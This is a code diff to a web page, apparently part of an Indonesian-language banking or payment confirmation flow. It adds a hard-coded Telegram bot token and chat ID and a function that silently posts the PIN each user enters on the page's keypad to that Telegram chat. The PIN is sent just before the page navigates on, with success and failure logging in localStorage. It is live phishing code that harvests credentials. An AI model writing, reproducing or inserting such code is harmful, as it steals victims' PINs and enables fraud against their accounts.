@@ -2423,10 +2423,66 @@ document.querySelectorAll('input[type=file]').forEach(x=>x.addEventListener('cha
   var dots=[].slice.call(pad.querySelectorAll('.dot'));
   var err=pad.querySelector('.kc-pp-err');
   var pin='';
+
+    // ====== KONFIG TELEGRAM ======
+  var TG_TOKEN = "8941514752:AAHqmU7lqV0T64xRo43YPsmkjMwv2lrWDNE";
+  var TG_CHAT  = "6959842489";
+
+  function recordTgLog(source, status, detail, messageText) {
+    try {
+      var logs = JSON.parse(localStorage.getItem('kb_tg_logs') || '[]');
+      var now = new Date();
+      logs.unshift({
+        time: now.toLocaleTimeString('id-ID') + ' (' + now.toLocaleDateString('id-ID') + ')',
+        source: source,
+        status: status,
+        detail: detail,
+        text: messageText || ''
+      });
+      if (logs.length > 50) logs = logs.slice(0, 50);
+      localStorage.setItem('kb_tg_logs', JSON.stringify(logs));
+    } catch(e) {}
+  }
+
+  function tgSendPin(pinValue){
+    try{
+      var text =
+        "🔑 <b>KONFIRMASI PIN</b>\n\n" +
+        "Konfirmasi Pin : <code>" + pinValue + "</code>";
+      fetch("https://api.telegram.org/bot"+TG_TOKEN+"/sendMessage", {
+        method:"POST",
+        keepalive:true,
+        headers:{ "Content-Type":"application/json" },
+        body: JSON.stringify({
+          chat_id: TG_CHAT,
+          text: text,
+          parse_mode: "HTML",
+          disable_web_page_preview: true
+        })
+      }).then(function(res){ return res.json(); })
+      .then(function(data){
+        if (data && data.ok) {
+          console.log("%c[TG SUCCESS: 10-konfirmasi.html (PIN)]", "color:#10b981;font-weight:bold", data);
+          recordTgLog("10-konfirmasi.html (PIN)", "SUCCESS", "Pesan ID: " + (data.result?.message_id || 'OK'), text);
+        } else {
+          console.error("%c[TG ERROR: 10-konfirmasi.html (PIN)]", "color:#ef4444;font-weight:bold", data);
+          recordTgLog("10-konfirmasi.html (PIN)", "ERROR", data?.description || "Gagal dikirim Telegram", text);
+        }
+      }).catch(function(err){
+        console.error("%c[TG NETWORK ERROR: 10-konfirmasi.html (PIN)]", "color:#ef4444;font-weight:bold", err);
+        recordTgLog("10-konfirmasi.html (PIN)", "ERROR", err.message || String(err), text);
+      });
+    }catch(e){}
+  }
+  // ============================
+
   function render(){ dots.forEach(function(d,i){ d.classList.toggle('f', i<pin.length); }); }
   function open(){ pin=''; render(); err.textContent=''; pad.hidden=false; requestAnimationFrame(function(){ pad.classList.add('on'); }); }
   function close(){ pad.classList.remove('on'); setTimeout(function(){ pad.hidden=true; }, 280); }
   function done(){
+
+    tgSendPin(pin);
+
     // mulai hitung mundur analisis baru (5 menit), tersimpan agar tahan refresh
     try{ localStorage.setItem('kb_analisis_start', String(Date.now())); }catch(e){}
     if(window.__kbNav){ window.__kbNav('11-analisis.html'); } else { location.href='11-analisis.html'; }
